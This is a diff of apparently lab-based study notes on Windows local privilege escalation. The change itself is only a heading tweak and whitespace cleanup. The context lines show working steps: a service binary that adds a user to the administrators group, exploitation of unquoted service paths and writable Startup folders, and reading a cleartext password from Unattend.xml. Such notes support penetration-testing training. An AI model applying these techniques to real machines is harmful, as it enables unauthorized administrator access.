@@ -1,6 +1,6 @@
 ## LOCAL PRIVILEGE ESCALATION
 
-### Basic Privilege escalation
+### Basic Privilege escalation (PowerUP)
 ```powershell
 1. Service Enumeration
 Get-ServiceUnquoted                 #   returns services with unquoted paths that also have a space in the name
@@ -107,7 +107,7 @@ Windows VM
 
 Kali VM
 1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
-2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
+2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')
 3. Copy the generated file x.exe, to the Windows VM.
 
 Windows VM
@@ -131,7 +131,7 @@ Windows VM
 
 ---
 ## Startup Applications
-### Detection 
+### Detection
 Windows VM
 1. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
@@ -193,7 +193,7 @@ Windows VM
 3. It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators
 
 ---
-## Unquoted Service Paths 
+## Unquoted Service Paths
 ### Detection
 Windows VM
 1. Open command prompt and type: sc qc unquotedsvc
@@ -218,7 +218,7 @@ Windows VM
 4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
 
 ---
-## Configuration Files 
+## Configuration Files
 ### Exploitation
 Windows VM
 1. Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml
@@ -229,7 +229,7 @@ Kali VM
 2. Notice the cleartext password
 
 ---
-## Memory 
+## Memory
 ### Exploitation
 Kali VM
 1. Open command prompt and type: msfconsole
